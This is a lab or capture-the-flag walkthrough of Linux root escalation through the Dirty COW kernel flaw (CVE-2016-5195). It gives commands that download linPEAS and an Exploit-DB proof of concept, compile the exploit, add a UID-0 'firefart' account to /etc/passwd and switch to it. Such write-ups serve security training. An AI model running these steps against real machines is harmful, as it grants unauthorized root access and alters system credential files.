# Privilege Escalation via Dirty COW (CVE-2016-5195)

## Introduction

In this project, we performed a **local privilege escalation** on a vulnerable Linux machine using the **Dirty COW vulnerability (CVE-2016-5195)**. This kernel vulnerability allows an unprivileged local user to gain **root access** by exploiting a race condition in the `copy-on-write` mechanism of memory management.

---

## Step-by-Step Exploitation

### 1. Enumeration with `linpeas.sh`

After gaining initial access as the low-privileged user `laurie`, we uploaded and executed `linpeas.sh` to enumerate the system for privilege escalation vectors:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
scp linpeas.sh laurie@192.168.56.101:~/
chmod +x linpeas.sh
./linpeas.sh
```
---

linPEAS scanned the system and highlighted the following vulnerability:

```
[+] [CVE-2016-5195] dirtycow 2

   Exposure: highly probable
   Tags: debian=7|8, ubuntu=14.04|12.04, ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839

```
This confirmed the target kernel was vulnerable to Dirty COW.

### 2. Preparing the Exploit
We downloaded a Dirty COW proof-of-concept (PoC) exploit (e.g., the "firefart" variant from Exploit-DB):
```
wget https://www.exploit-db.com/download/40839 -O dirty2.c
gcc -pthread dirty2.c -o dirty -lcrypt

```

#### The exploit works by:

Overwriting the /etc/passwd file to inject a new root user with a known password hash. The injected user is typically named firefart.

### 3. Executing the Exploit

Running the exploit binary:
```
./dirty
```
It successfully created the following user entry in /etc/passwd:
```
firefart:<password-hash>:0:0:pwned:/root:/bin/bash
```
This gives firefart UID 0, effectively making it a root user.

### 4. Privilege Escalation to Root
Switching to the firefart user:
```
su firefart
password:(password entered in the exploit)
```
Now we had root shell access on the target system.

## Cleanup
To avoid leaving the system in a compromised state

Removed the created firefart user.

Restored the original /etc/passwd file (if backed up by the exploit).

Deleted exploit binaries and scripts.
